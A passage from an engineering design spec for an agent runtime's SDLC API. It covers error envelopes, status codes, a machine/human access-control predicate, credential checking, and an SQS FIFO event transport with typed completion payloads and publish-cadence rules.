**Verified against the runtime:** `interface ErrorResponse { error: string }` is declared locally in each route file (`routes/sessions.ts:26-28`, `routes/approvals.ts:6-8`) and every error reply uses it — e.g. `400 {error: "mode must be 'do' or 'plan'"}` (`sessions.ts:264-266`), `404 {error: 'Session not found'}` (`:420-422`), `409 {error: 'Session is already active'}` (`:446-448`), and a catch-all `500 {error: \`Failed to resume session: ${msg}\`}` that echoes `err.message` verbatim (`:405-408`). This matches `{error?: string}` on `CreateSessionResponse` (`api.ts:15-18`) and `GetSessionResponse` (`api.ts:40-44`). No `code` field anywhere.

**Two exceptions that exist today and that CC must tolerate:**

- A `409` conflict adds a `conflict` object, built by the one shared helper `conflictResponse(diag)` (`sessions.ts:79-91`, typed `SessionConflictResponse` at `protocol/src/api.ts:97`). CC ignores it; it is diagnostic.
- One `200` response is not a session at all: `{status: 'unshared', tombstone}` (`sessions.ts:157`). CC's `getSession` must not assume a `200` implies `.session` is present.

**And one that is a trap:** there is **no `setErrorHandler` and no `setNotFoundHandler`** on the runtime. A request to a path that matches no route gets **Fastify's default envelope, `{message, error, statusCode}`** — a different shape, with `error` holding a status name like `"Not Found"` rather than a message. This is documented as a real client hazard at `nevado-sherpa-tui/docs/RUNTIME_API.md:143-152`. So during Phase 1 and Phase 2, **a typo in a URL produces a `404` whose body looks superficially like the error envelope but is not.** Do not parse it; check the status. (Adding a `setNotFoundHandler` to the `/v1/sdlc` encapsulation is a cheap improvement — Phase 1 Task 1.6 — but CC must not depend on it.)

**CC branches on the HTTP status, never on the message string.**

**CC-side rule, non-negotiable:** never parse `error` to decide behaviour. Status code only. A message-string branch is the exact failure class that `runtimeEvents.js`'s header warns about (`:11-23`) and that `PauseReason` was introduced to prevent (`engine-types.ts`: built so *"surfaces don't string-sniff progress text to decide what to do next"*).

Status codes the SDLC surface uses, complete set: `200` (read, cancel, release), `201` (create, including `status: 'queued'`), `400`, `401`, `403`, `404`, `503`. **No `202` and no `204`** — an earlier draft used both; create is `201` and release is `200` (§A.2.1, §A.2.4). `409` is used by the human routes (`messages`, `broadcast`) but **not by any SDLC endpoint**, because the branch collision it would have signalled does not exist (§A.2.1). Anything else is a bug. `5xx` and timeouts are **retryable and must never fail a cycle** — architecture doc §3.9's table is explicit and correct on this.

### A.3 The ACL

**⚠ There is no authorization in the runtime today.** This is the biggest gap between the architecture doc and reality — see §0.1.b C18/C19, §0.1.d(2), and §0.4 BQ4 for the decision. In summary:

- `req.userId` is the literal `'dev-user'` for every request (`apps/runtime/src/index.ts:91-100`), and **no HTTP route handler reads it at all**.
- `GET /sessions/:id` (`routes/sessions.ts:389-415`), `DELETE /sessions/:id` (`:417-439`) and `GET /sessions` (`:373-387`) perform **no ownership check whatsoever**. Anything past the ALB can read any session's full transcript.
- `SessionManager.create` **forces** `createdBy: this.userId` (`sherpa-core@4.0.1 session-manager.ts:759`, unconditional). Every session therefore has the same `createdBy`, so **a `createdBy`-scoped ACL over today's code partitions nothing**.
- The architecture doc's premise that "the human path scopes by `userId`" is **false**. The rules below will be the first authorization in this service and cannot piggyback on anything.

**⚠ ~~Prerequisite: Task 1.2b.~~ No longer a prerequisite for anything here (revision 6).** Command Center's own machine-token classifiers (`middleware/auth.go:20-23`, `tenantHelpers.js:11-14`) both require `sub` to be absent, and a real `client_credentials` token **carries `sub`, equal to `client_id`** — verified live on 2026-09-24 (§0.4 BQ1) — so they return `false` for every machine token that exists. **The defect is real and stands as a standalone issue (§0.9.1a), but nothing in this section touches it**: there is no Cognito token in the SDLC ingress at all, so there is no claim to classify, no scope check to fix and no CC-side audit attribution derived from one. The runtime-side predicate below was always unaffected — it is `application === 'sdlc'` on the session record, not a claim test.

**v1's ACL enforces one predicate: `application === 'sdlc'`.** That is not a compromise, it is the whole of v1's real security value — a machine caller cannot read a human transcript, and a human cannot resume an SDLC session. It requires **no SDK change**, because `application` (unlike `createdBy`) is settable by a caller today: the forced spread at `session-manager.ts:768` is conditional on `this.application`, and the runtime's manager is constructed without one (§0.1.d(2)).

**⚠ That accident is exactly why the create route asserts `application` against the PERSISTED record**, not against the create argument or the response body. Anyone who later gives the runtime's manager an `application` — plausibly `'web'`, to make human sessions self-describing — silently starts overriding `'sdlc'` and **quietly disables the whole ACL**, with no build failure anywhere. `SDLC_APPLICATION` is pinned in the driftguard for the same reason: a typo in it does not fail a build, it makes every SDLC session unreadable by its own creator and every human session readable by a machine caller.

##### Per-client partitioning is not deferred. It is ruled out.

**Revision 6 replaces this subsection outright.** Two earlier revisions said partitioning on `createdBy` was "deliberately deferred" and that `createdBy: "m2m:<client_id>"` was "written from day one — free once 4.0.2 unforces it, so the predicate can be added later with no migration". **Every clause of that is false.** Three findings, and the third is the one that closes the question permanently:

1. **`createdBy` is not written, and cannot be.** `SessionManager.create` in `@nevadoai/sherpa-core@4.0.1` sets `createdBy: this.userId` in a block its own source labels *"forced (un-overridable)"*, **after** spreading the caller's options. The label the route passes is discarded, and **every SDLC session persists `createdBy: 'dev-user'`**, the runtime's hardcoded `userId`. The `m2m:` value can be read back from nowhere.
2. **The forcing is CORRECT and is not going to be relaxed.** The SDK change to relax it was authorised, opened as `sherpa-sdk` #226, and **closed unmerged** (BQ3a). `createdBy` **backs a live ownership check**: `renameSession` throws `RemoteSessionNotOwnedError` when `record.createdBy !== this.userId`, and `isSessionRenamable` (`@nevadoai/sherpa-protocol`) refuses a remote-only session the same way. Both fail **open** when the field is absent and **closed** when it disagrees. So: **do not make the label survive.** There is a one-line way to — `SessionManager.save` is a bare `store.save` that forces nothing, so writing `session.createdBy` before the `manager.save(session)` the create route already performs would persist it — and doing so would make that comparison true and render **every SDLC session un-renameable.** A live human capability, traded for a label.
3. **Under the bearer token there is nothing to partition on at all.** One shared secret carries no subject, no client name and no key. So a per-client predicate over `createdBy` is void **wherever the value is kept**: partitioning on the stored value partitions on a constant, and partitioning on the presented credential partitions on one string held by whoever holds it.

> **A second machine client that must be told apart gets its own CREDENTIAL. Not another field, not a second parser, and not a migration.**

What the ACL does rest on is **`application`**, which survives the forced block. Recorded as command-center #821.

**What caller identity is worth here, stated honestly.** Nothing, on the operated path. The route resolves a label — `m2m:bearer` under the token, `m2m:<CN>` under a client certificate — and the label is **not read by anything**, does not reach the record, and names the credential rather than a caller. It is a naming convention and nothing more. **Under the retained certificate path the ALB does authenticate a subject and injects the result, overwriting anything the client sent, so `X-Amzn-Mtls-Clientcert-*` cannot be forged** — that much of the earlier text stands, for that path.

**Still do not call the ACL an authorization system** in any doc, commit message or runbook. **It is a machine/human separation plus a caller label the stored record does not keep.** Architecture doc R2 exists because someone will otherwise cite it as evidence of isolation.

##### The two credentials the hook accepts, and the order it tries them in

**Either admits; a request is refused only when NEITHER does.**

| Credential | Evidence the hook reads | Notes |
|---|---|---|
| **Bearer token** (operated) | `Authorization: Bearer <token>`, compared against the boot-read secret as **SHA-256 digests under `timingSafeEqual`** | The scheme is matched **case-insensitively** — RFC 7235 §2.1 makes it so, and a caller spelling it `bearer` is interoperating correctly. The remainder is taken **verbatim**, not `\S+`-matched: the token is an opaque string chosen by whoever wrote the secret, and a matcher that silently reshaped it would turn a surprising secret into an unexplainable 403 |
| **Client certificate** (retained, inactive) | `X-Amzn-Mtls-Clientcert-Subject`, injected by the :8443 listener with `overwrite:` | **Presence is REQUIRED on this path, not merely checked when present.** The :443 and :8443 listeners share one target group, so the header's absence is the **only** evidence a request did not arrive through the mutual-TLS door. `-Serial-Number` is worth logging: it identifies *which* leaf called, and therefore what you revoke. `-Issuer`, `-Validity`, `-Leaf` are available and unused |

**The token is tried FIRST, and the reason is not preference.** Trying the certificate first would let a *presented and rejected* token abort a request that a valid certificate would have admitted — an mTLS regression introduced by adding a second credential. Order here means "cheapest check first, no early refusal".

**The CN allowlist applies to certificates only**, and that asymmetry is deliberate. It names subjects a CA signed; **a shared token carries no subject to compare it against**, and silently widening the allowlist's meaning to "or anyone holding the token" would make it look like it constrained something it does not. Empty means "any subject the CA signed" — which is fine while the CA signs one leaf and is not the moment it signs a second, so `SDLC_ALLOWED_CLIENT_CNS` exists for that day.

**On a refusal, log presence and nothing else.** `bearerPresented: true|false` separates "Command Center is not sending it" from "the two sides hold different secrets". **Never the token, never a prefix, never its length, never inside an error.**

Rules, enforced at the runtime on the session record. **The right seam is a Fastify `preHandler` hook inside the `/v1/sdlc` encapsulation** — a plugin registered with a prefix is its own scope, so `instance.addHook('preHandler', …)` applies to `/v1/sdlc/*` only and **cannot leak onto the human `/v1/workspace` routes**. Do not add it to the root instance. **Two details the shipped hook got wrong first and are worth inheriting rather than rediscovering:**

- **Exempt `/health` by matching the PATH, not `req.url`.** `req.url` is the raw request target and includes the query string, so `endsWith('/health')` on it is wrong in both directions: `?x=/health` on **any** route satisfied the exemption and skipped the credential check — and on `POST /sessions`, which has no `:id` for anything downstream to re-check, **that created a session** — while a legitimate `/health?probe=1` was rejected.
- **`DELETE` alone continues when the id resolves to nothing.** Release must be **idempotent**, because Command Center retries it and a retry turning into a failure is how a supersede silently does not happen. Every other method answers `404`.

| Operation | Rule |
|---|---|
| **Create** | **One credential, checked by the runtime.** There is no Cognito scope in this path — the API Gateway front door is gone (§0.9.1), so route-level `authorization_scopes` has nowhere to live, and **application-side scope enforcement does not work anyway**: `HasScope` (`auth.go:138-152`) treats `full_access` as a wildcard at `:147` but has **zero callers**, and its `IsMachineToken` guard at `:139` returns `false` for every real machine token (§0.9.1a), so it would refuse every M2M caller even if called. **Do not build the ACL on it.** The session is stamped `application: "sdlc"`. **It is NOT stamped with a machine `createdBy`** — that value is forced to the runtime's own `userId` and cannot be set; see above. |
| **Read (`GET`)** | **Only sessions with `application === 'sdlc'`.** Anything else — a human `web`/`ide`/`tui` session, or a session with **no** `application` — returns `404`, **not `403`**: a `403` confirms the id exists and turns the endpoint into a session-id oracle. **Absent `application` fails CLOSED**, because sessions created before this shipped carry none and a permissive default would make every one of them machine-readable. Under the SQS design this `GET` is the *only* read path a machine caller has, which makes it both narrower and more important than it looks. |
| **Cancel / Delete** | Same predicate, same `404` on anything else — **except that `DELETE` on an unknown id continues rather than 404ing**, because release must be idempotent under Command Center's retry. |
| **Per-client partitioning** | **Ruled out, not deferred.** `createdBy` is neither written nor readable, and one shared token has nothing to partition on. See above. |
| **Settings** | **`PUT /v1/workspace/settings` must not be reachable from the SDLC ingress.** It mutates the process-wide settings store and writes `~/.config/nevado/settings.json` (`routes/settings.ts:24-28`), so a machine caller could flip `autoApproveAllCommands` for **every session on the box, human included** (§0.1.b C28). What keeps it out of reach is that the machine credential admits a request to `/v1/sdlc/*` and **nothing else is served under that prefix** — the Fastify encapsulation is the boundary, and the `setNotFoundHandler` inside it answers a typo with the `{error}` envelope. So the requirement is "**do not add a settings route under `/v1/sdlc`**", and it is worth an explicit test that no such route exists. Note what this is **not**: the priority-6 rule forwards only `/v1/sdlc/*`, but it forwards to the **same target group the human surface uses**, so the ALB is not what partitions the two namespaces — the prefix and the hook are. |

Two invisibility requirements, both testable:

1. **A machine-created session must not appear in the human session list.** `application: "sdlc"` is the filter.
2. **A machine-created session must not be resumable from a human surface.** The failure mode is a human resuming a half-finished SDLC session and quietly corrupting a cycle.

Both need explicit tests (§A.9, Phase 2 Task 2.9). Both are the kind of thing that works on the day it ships and rots silently.

~~**`createdBy` is a repurposing that needs a comment.**~~ **Struck (revision 6). There is no repurposing, because the field is never written with a machine value.** `session.ts:117-118` documents it as human identity — `/** User identity — e.g. "jeff", "tyler" */` — and that documentation is accurate: the field holds human identity, backs `renameSession`'s ownership check, and is forced by `SessionManager.create`. **The `m2m:` namespace exists only as a label the route computes and nothing persists.** Do not add a protocol comment describing a convention the code does not follow.

### A.4 Outbound: the SQS FIFO event transport

The runtime publishes; nothing subscribes. There is no inbound event connection, no reconnect, no cursor, no `catchUp`.

```
runtime (EC2 instance role + one new sqs:SendMessage statement)
  -> SQS FIFO  command-center-sdlc-events-<env>.fifo
       MessageGroupId          = sessionId                 <- per-session ordering
       MessageDeduplicationId  = <uuid v4 per envelope>    <- retry-stable within 5 min
  -> aws_lambda_event_source_mapping (batched, ReportBatchItemFailures)
  -> sdlcEventConsumer Lambda
       -> mapSessionEvent(event, {session, stage})
       -> applyRuntimeEffect(effect, ctx)
       -> exits
  \-> on repeated failure -> command-center-sdlc-events-dlq-<env>.fifo
```

`messageGroupId = sessionId` makes SQS responsible for ordering, so **the consumer never reorders**. Nothing in this design needs a monotonic counter (BQ2).

#### A.4.1 Message envelope

```ts
// nevado-sherpa-tui: apps/runtime/src/sdlc/publisher.ts   (declared in the RUNTIME, not the SDK)
// The authority for this format is the CONSUMER: command-center
// backend/go/internal/orchestrator/sdlcevent's ValidateEnvelope is what actually parses these,
// and anything it rejects goes to the DLQ where its reason string is the only diagnostic.
export interface SdlcEventEnvelope {
  readonly v: 1;                       // REQUIRED. Envelope version.
  readonly sessionId: string;          // REQUIRED. Also the MessageGroupId.
  readonly dedupId: string;            // REQUIRED. UUID v4, minted once per envelope,
                                       //   reused across retries of that one SendMessage.
                                       //   This IS the MessageDeduplicationId.
  readonly publishedAt: string;        // REQUIRED. ISO-8601 UTC with ms.
  readonly correlation: SdlcCorrelation;  // REQUIRED. Echoed verbatim from create.
  readonly events: readonly SdlcEvent[]; // REQUIRED. Length >= 1. Never empty.
}
```

- **`v` is what makes independent deploys survivable.** The runtime and the consumer ship from different repos on different cadences (§0.3) and cannot be released atomically. The consumer MUST accept `v: 1` and MUST reject an unknown `v` by reporting the message as a batch item failure with a log line naming the version — **not** by silently ignoring it, because that loses a cycle's events with no signal.
- **`events` is never empty.** An empty Tier-2 window publishes nothing (§A.4.4); an envelope with `events: []` is a publisher bug and the consumer treats it as a poison message.
- **`correlation` is the mechanism that removes the session→cycle lookup.** The consumer resolves `PK = \`APP#${correlation.applicationId}\`` and `SK = correlation.cycleId` directly. No DynamoDB read, no GSI, no map to keep consistent.
- **`sessionId` on the envelope is authoritative.** Every `ServerMessage` variant except `connected`/`pong` also carries `sessionId` (`messages.ts:3-29`) — §0.1.a C9. Inside a batch they will all be identical to the envelope's. The consumer MUST use the envelope's and MAY assert the per-event ones match; it MUST NOT use a per-event `sessionId` in preference.
- **`dedupId` is per-message, not per-event, and it is the only field SQS looks at.** A Tier-2 message carrying eight tool events gets one `dedupId`. It is minted when the envelope is constructed and **reused if that `SendMessage` is retried** — that is the entire requirement (BQ2). The consumer never reads it.
- **`seq` is GONE — there is no such field (revision 6).** An earlier draft made it a durable counter, which had a silent catastrophic failure mode (a reused id is dropped by SQS with no error) and put a process-globally-locked whole-file rewrite of `sessions.json` on the publish hot path; BQ2 demoted it to optional in-memory log decoration. **It is now absent entirely**, and the consumer's `Envelope` struct has no field for it. That was the right end state and the earlier text said as much — *"if keeping `seq` at all invites someone to depend on it, drop it"*. **Do not add it back for log readability**: the `dedupId` is already written into the body for exactly that purpose, so an operator reading a DLQ message can correlate it with the send.
- **The `dedupId` appears in the BODY as well as in the `MessageDeduplicationId` parameter**, and the duplication is deliberate: SQS does not echo the parameter back, so a DLQ message with no id in its body cannot be tied to the send that produced it.
- **Sends are SERIALISED per session, on a promise chain per `sessionId`.** FIFO preserves order within a `MessageGroupId` **only over the order sends were ACCEPTED** — firing `SendMessage` without awaiting lets two calls race inside the SDK and arrive transposed, so **the consumer could see a completion before the `toolEnd` that produced it.** Per session and **not** one global chain, or a slow send on one cycle delays every other cycle on the host.
- **A publish failure never propagates.** By the time an event is published the agent has done the work and possibly pushed it, so failing the turn would **destroy real work to report a telemetry problem.** A missing event is recoverable — `GET /v1/sdlc/sessions/{id}` still returns the terminal result, which Command Center already handles — whereas a failed turn is not. Log loudly and **continue the chain**, so a transient error cannot wedge the session's remaining events, the completion among them.

#### A.4.2 The event set

```ts
// nevado-sherpa-tui: apps/runtime/src/sdlc/publisher.ts
export type SdlcEvent =
  // ---- already ServerMessage variants (messages.ts:3-29), minus sessionId ----
  | { readonly type: 'toolStart';     readonly tool: string; readonly input: Record<string, unknown> }
  | { readonly type: 'toolEnd';       readonly tool: string; readonly status: 'success' | 'error'; readonly output?: string }
  | { readonly type: 'progress';      readonly message: string }
  | { readonly type: 'error';         readonly error: string }
  | { readonly type: 'sessionStatus'; readonly status: SessionStatus; readonly reason?: PauseReason }
  | { readonly type: 'planCreated';   readonly filePath: string; readonly content: string }
  // ---- new ----
  | { readonly type: 'completion';    readonly payload: CompletionPayload };
```

`sessionId` is dropped from the per-event shapes because the envelope carries it (§A.4.1). If the publisher finds it cheaper to forward the `ServerMessage` verbatim, an extra `sessionId` key is permitted and ignored (unknown fields are ignored, §Section A preamble) — but the envelope's value remains authoritative.

**Everything else the human WebSocket carries is never published.** The complete never-publish list, verified against `messages.ts:3-29`: `connected`, `pong`, `streamStart`, `streamDelta`, `streamEnd`, `toolRejected`, `approvalRequired`, `questionRequired`, `sessionSync`, `modeSwitch`, `taskTrackerUpdate`, `subAgentStart`, `subAgentEnd`, `subAgentToolStart`, `subAgentToolEnd`, `tokenUsage`, `catchUp`. That filter is the point of a separate publication path — `streamDelta` alone is the majority of the human stream's frames and has no cycle effect.

Three of those exclusions are worth justifying because someone will try to add them back:

- `modeSwitch` **cannot occur** in an SDLC session. It fires only when the agent calls `switchMode` (`orchestration-tools.ts:18-30`), which no role's allowlist grants (§A.7), and CC never switches a live session's mode.
- `approvalRequired` / `questionRequired` cannot occur either: an SDLC session's approval callback returns `true` early **without emitting** (§A.7.1, keyed on `application === 'sdlc'`), and `askQuestion` is absent from every allowlist with `ctx.question` left unset (§A.7.2).
- `tokenUsage` is deliberately excluded because it is per-turn and would defeat the coalescing. Cumulative totals ride on the completion payload instead (§A.4.3).

Two additive protocol changes this union requires (§A.8):

- **`reason?: PauseReason` on `sessionStatus`.** An SDLC session cannot pause on a gate — there are no approvals and no questions — so **every pause is a failure of some kind**, and they want different responses. `PauseReason` is a complete structured type already (`engine-types.ts:54-63`): `'end_turn' | 'completed' | 'aborted' | 'max_turns' | 'context_exhausted' | 'inactivity_timeout' | 'stream_dead' | 'sso-expired' | 'llm_error'`. It has never reached the wire. Without it, `max_turns` (task too big for one session), `sso-expired` (credentials on the instance need attention) and `llm_error` (worth a retry) are indistinguishable.
- **`'queued'` on `SessionStatus`.** Otherwise a session waiting behind the cap is indistinguishable from a running one and the cycle shows work happening when nothing is. Note `HealthResponse.queuedSessions` already exists (`api.ts:54-60`), so a queue concept exists server-side — find it, don't invent it.

#### A.4.3 `CompletionPayload` — three kinds, one typed and two opaque

```ts
export type CompletionPayload = EngineeringCompletion | PlanResult | ReviewResult;
```

Discriminated on `kind`: `'engineering' | 'plan' | 'review'`. **One kind per terminal tool, and the tool name is the discriminator.**

| Produced by | `kind` | Payload shape |
|---|---|---|
| `reportCompletion` (§A.5.1) | `'engineering'` | **fully typed** — its fields are git and session vocabulary, and they drive behaviour *inside* the tool (`commitMessage` becomes a commit subject, `outcome` decides whether to push) |
| `submitPlan` (§A.5.2) | `'plan'` | `payload: unknown` — **opaque**, forwarded verbatim |
| `submitReview` (§A.5.2) | `'review'` | `payload: unknown` — **opaque**, forwarded verbatim |

**The design history matters here, because two earlier revisions of this document got it wrong in opposite directions and the reasons are instructive.**

Revision 1 followed the architecture: three tools with CC's plan and QA schemas written out as typed protocol interfaces *and* as `inputSchema` literals in `tool-specs.ts`. Revision 2 collapsed all three into one generic `submitResult`, removing the schemas. **Both were wrong.** Revision 1 put Command Center's product taxonomy — `requirements[].acceptanceCriteria`, `complexity`, `category: 'feature'|'bugfix'|'enhancement'|'infrastructure'`, `severity: 'blocker'|'major'|'minor'|'nit'` — inside a package whose deploy path is an outage window. Revision 2 fixed that but **threw away the stage discriminator to do it**, and it did not need to: with one tool, `planning` and `qa` both produced `kind: 'result'`, so the `kind` ↔ `correlation.stage` cross-check this document spends a paragraph defending became **vacuous for exactly the two stages that need it.** A review payload mislabelled `stage: 'planning'` — plausible, since Part 2 routes all three stages through one shared dispatch helper — would have gone to the plan validator and landed as `PLANNING_FAILED` on a QA step: misdiagnosed, misrouted, wrongly named, undetectable at the boundary.

**Three tool names cost nothing and restore the check.** The name is not the problem; the *contents* were. See §A.5 for the full rationale, which is operational rather than architectural.

```ts
export interface EngineeringCompletion {
  readonly kind: 'engineering';
  readonly outcome: 'success' | 'blocked';
  readonly summary: string;                  // REQUIRED. One paragraph: what changed and why. Becomes the PR body.
  readonly verification?: string;            // OPTIONAL. What was run (tests, build) and the result.
  readonly blockedReason?: string;           // REQUIRED when outcome === 'blocked', else absent.
  readonly branch: string;                   // REQUIRED. From git, after push.
  readonly commitSha: string;                // REQUIRED. `git rev-parse HEAD`, after push.
  readonly filesModified: readonly string[]; // REQUIRED. session.filesModified UNION `git diff --name-only`.
  readonly pushed: boolean;                  // REQUIRED.
  readonly model: string;                    // REQUIRED. The model ACTUALLY used.
  readonly usage: { readonly inputTokens: number; readonly outputTokens: number };
}

export interface PlanResult {
  readonly kind: 'plan';
  readonly outcome: 'success' | 'blocked';
  readonly summary: string;                  // REQUIRED. Human-readable, one paragraph.
  readonly blockedReason?: string;           // REQUIRED when outcome === 'blocked'.
  readonly payload: unknown;                 // REQUIRED when outcome === 'success'. OPAQUE.
  readonly model: string;
  readonly usage: { readonly inputTokens: number; readonly outputTokens: number };
}

export interface ReviewResult {
  readonly kind: 'review';
  readonly outcome: 'success' | 'blocked';
  readonly summary: string;
  readonly blockedReason?: string;
  readonly payload: unknown;                 // REQUIRED when outcome === 'success'. OPAQUE.
  readonly model: string;
  readonly usage: { readonly inputTokens: number; readonly outputTokens: number };
}
```

**`PlanResult` and `ReviewResult` are structurally identical, and that is deliberate — do not collapse them.** They differ only in `kind`, which is the whole point: it is what the consumer cross-checks against `correlation.stage`, and it is what makes a mislabelled stage a loud DLQ-able configuration bug rather than a silently misrouted payload. A shared `interface OpaqueResult` with a `kind` type parameter is fine as an implementation detail; two exported names that a consumer can `switch` on exhaustively is the contract.

**Not present anywhere in the runtime's `sdlc/` modules, and this is the property to protect:** no `requirements`, no `acceptanceCriteria`, no `complexity`, no `category`, no `verdict`, no `severity`, no `findings`, no `overallQuality`, no `requirementsMet`, no `filesToCreate`. **No Command Center business field appears anywhere in the runtime's protocol package.** §A.8 is a list that should never need a row added for a plan or QA schema change again; that property is unchanged from revision 2 and it is the one that mattered.

**Consistency between `kind` and `correlation.stage`**, checked in the consumer (the runtime no longer reads `stage` at all — §A.2.1's courier rule):

| `correlation.stage` | required `kind` | payload validated against |
|---|---|---|
| `planning` | `plan` | `PLAN_PAYLOAD_SCHEMA` |
| `engineering` | `engineering` | n/a (typed on the wire) |
| `qa` | `review` | `QA_PAYLOAD_SCHEMA` |

A mismatch means CC granted the wrong tool. It **must fail loudly** — a batch item failure, so it DLQs and pages (§A.4.6) — not be coerced.

**Belt and braces on the mislabel case.** The table above catches a mislabel only because three tools produce three kinds. There is a second, cheaper check worth adding: **CC names the expected stage inside `resultSchema` itself** (§A.5.3) — a `const`-style property, or a sibling `resultKind` string on the create request. The consumer then cross-checks the arriving `kind` against *what this session was configured to produce*, not merely against a constant table. That catches a CC-side mislabel at create time rather than at completion. Cheap, and it is the only check that survives if someone later re-collapses the tool names.

##### The oversize gate, and why 256 KB is the wrong single bound

**Two limits bind, not one. Check both.**

| Limit | Value | What fails if exceeded |
|---|---|---|
| SQS message size | **256 KB** | the envelope cannot publish. The agent has already finished; the cycle sees a lost completion |
| **DynamoDB item size** | **400 KB** for the *whole cycle record* | the payload publishes happily and then **cannot be persisted** |

An earlier revision bounded only at 256 KB, against SQS. **That leaves a band of payloads the runtime forwards and Command Center cannot store** — and the DynamoDB limit is the binding one in practice, because the 400 KB is shared with `progressLog`, `iterations`, `activities` and `expandedRequirements` on the same item. A plan of 300 KB publishes fine and then fails the `UpdateCommand`, *after* the session is gone, as a lost completion rather than a correctable `toolError`.

So:

- **The runtime's hard bound stays 256 KB** — it is a real transport limit and the runtime owns it. Exceeding it is a `toolError` naming the size, so the agent trims and retries in-session.
- **Command Center's real budget is expressed in `resultSchema`** as `maxLength` on string fields and `maxItems` on arrays (§A.5.3). That is how CC's 400 KB-minus-whatever-else-is-on-the-item constraint reaches the agent **as an in-session, correctable error** instead of a post-hoc persistence failure. CC computes the budget; the runtime enforces whatever numbers it is handed, generically.
- **The consumer still checks before persisting** (§A.4.6's terminal-status row). A payload that fits the schema but not the item is `PLANNING_FAILED`/`QA_FAILED` naming the size — deterministic, so it must not DLQ.

This is the clearest single illustration of why the schema belongs in Command Center: **only CC knows how much room is left on the cycle item**, and that number changes per cycle as `progressLog` grows.

**Token accounting applies to all three shapes.** `usage` is **exactly** `{inputTokens, outputTokens}`, matching `TokenUsage` (`session.ts:5-8`). **Cache read/write counts do not survive the move.** `bedrockConverse.js:168-193` captures them today; the SDK never does, and widening `TokenUsage` means changing the protocol *and* the engine's Bedrock response handling. A real regression in cost attribution, and the price of the migration. Do not add cache fields as a placeholder — an always-absent field is worse than an acknowledged gap.

Notes on `EngineeringCompletion` that are contract:

- **`branch` — HEAD is not detached.** A `commitSha` checkout uses `fetch --depth 1` + `reset --hard FETCH_HEAD` specifically so HEAD stays on a branch (§0.1.b C22), so `git rev-parse --abbrev-ref HEAD` resolves. If it ever returns `HEAD` and `outcome === 'success'`, that is a `toolError`, not an empty string.
- **`filesModified` is a union**, not `session.filesModified` alone. The session's list tracks what the agent's tools touched; `git diff --name-only` catches what a `runCommand` changed (a formatter, a codegen step, a lockfile). Both matter to the PR body and the progress line.
- **Keeping it typed buys a removed round trip.** `commitSha` and `branch` are absent from the event stream today, which is the only reason `buildCompletionEffect` has to fetch the `AgentSession` (`runtimeEvents.js:20-23`, `:88-90`). Typing them onto the completion removes that fetch.

#### A.4.4 Publish cadence — two tiers

**Tier 1 — immediate, never coalesced.** Anything that changes cycle state:

| Event | Why immediate |
|---|---|
| `sessionStatus: 'active'` (session started) | the cycle should show work beginning without a 10 s lag |
| `error` | drives a status transition; delay here is delay in telling a human |
| `completion` | terminal; carries the step's payload and triggers PR creation |
| `planCreated` | produces the durable artifact the approval gate reads |
| `sessionStatus: 'paused'` with a `reason` | the session has stopped and will not resume itself; coalescing would delay the only signal that work ended early |

**Tier 2 — coalesced on a ~10 second window.** `toolStart`, `toolEnd`, `progress`, batched into one message carrying an `events[]` array.

- **Publish nothing when the window is empty.** An idle session must not emit heartbeat traffic. This starves `cycle.updatedAt`, which is deliberate — see the stall-handling note below.
- **Flush unconditionally on any Tier-1 event,** so a `completion` never arrives before the activity that preceded it. Same `messageGroupId`, so FIFO guarantees the flush lands first.

Two independent justifications, both measured rather than aesthetic:

1. **Higher frequency is invisible.** `ApplicationDetail.jsx` polls cycles every 10 000 ms (`:205-207`, gated on `shouldPoll`), and `CycleProgress.jsx:76` renders `activities.slice(-10).reverse()` — the last ten entries only. Publishing per-tool-call would write rows overwritten in the UI before anyone sees them: measurably more transport work to display strictly less.
2. **DynamoDB charges WCUs on post-update item size, not delta size.** Activities are appended with `list_append` onto the cycle item (`progressLogger.js:43`). The cycle record also carries `expandedRequirements` — `summary`, `approach`, `requirements[]` with nested `acceptanceCriteria`, `risks[]`, `assumptions[]`, `filesToCreate[]`, `filesToModify[]` — so it is a large item from the moment planning completes. Every per-tool append rewrites that whole item against a single partition key. Coalescing to 10 s cuts that by roughly an order of magnitude at zero cost to what anyone can see.

**Coalescing lives in the runtime, not the consumer.** Batching on the publish side saves SQS messages, Lambda invocations and DynamoDB writes. Batching on the consume side saves only the last.

**If per-tool fidelity is wanted later, do not publish more often.** Store activities as separate items under the cycle (`PK = CYCLE#<id>`, `SK = ACTIVITY#<seq>`), which makes each write small and constant-size. Flag clearly that **it changes the read path**: `ApplicationDetail.jsx` gets the feed embedded in the cycle record it already polls; separate items mean a second query and a merge. That is a UI decision for later, not a transport one.

#### A.4.5 Dedup, and what duplicate delivery costs

`MessageDeduplicationId = envelope.dedupId`, a **UUID v4 minted once per envelope and reused across retries of that one `SendMessage`** (BQ2). `content_based_deduplication` is **off** — explicit ids are supplied, and leaving it on would dedup two genuinely different batches whose bodies happen to match, which is plausible for a repeated `progress` line and would **silently lose events**.

**Dedup is narrow, and deliberately so.** It covers exactly one case: the runtime retries a `SendMessage` that actually succeeded, within five minutes. A DLQ redrive an hour later does not dedup. Neither does a republish after a process restart, because the restart mints a new UUID — **and that is the correct behaviour**: a new id is delivered as a duplicate, which the consumer is idempotent against, whereas the durable-counter design an earlier draft specified would have reused an id and had SQS drop the message with no error anywhere. That failure mode (architecture doc risk R5c) **no longer exists** and R5c can be closed.

**So duplicate delivery must be assumed and the effects must survive it** — and with a UUID dedup id, duplicates are now the *expected* outcome of a restart rather than an edge case, which makes the idempotency work below load-bearing rather than defensive. The effects currently do not survive it, in one specific way:

- `addProgressLog`'s `list_append` (`progressLogger.js:43`) is not idempotent. A duplicate activity line is cosmetic, and that is the right place for the trade to land.
- **Status transitions must not double-apply, and `applyTransition` does not prevent it.** It takes `strict = false` by default and, on an illegal transition, calls `reportIllegalTransition` and then **assigns anyway** — `cycle.status = toStatus` at `sdlcEngine.js:544` runs unconditionally. The docblock (`:519-529`) is explicit that this is deliberate: 24 of 54 call sites target `FAILED` from error handlers, and throwing there would strand a cycle. So a replayed `ENGINEERING → QA_TESTING` on a cycle already past QA logs a violation and then **moves the cycle backwards**.

  Two options. **Take the second.**
  1. Pass `strict: true` from the consumer and catch the throw. Cheap, but it opts one caller into a mode the rest of the codebase does not use, and the table is admittedly incomplete (*"a gap in the table is at least as likely as a genuine bug in a caller"*, `sdlcEngine.js:524-526`) — so a table gap becomes a dropped event.
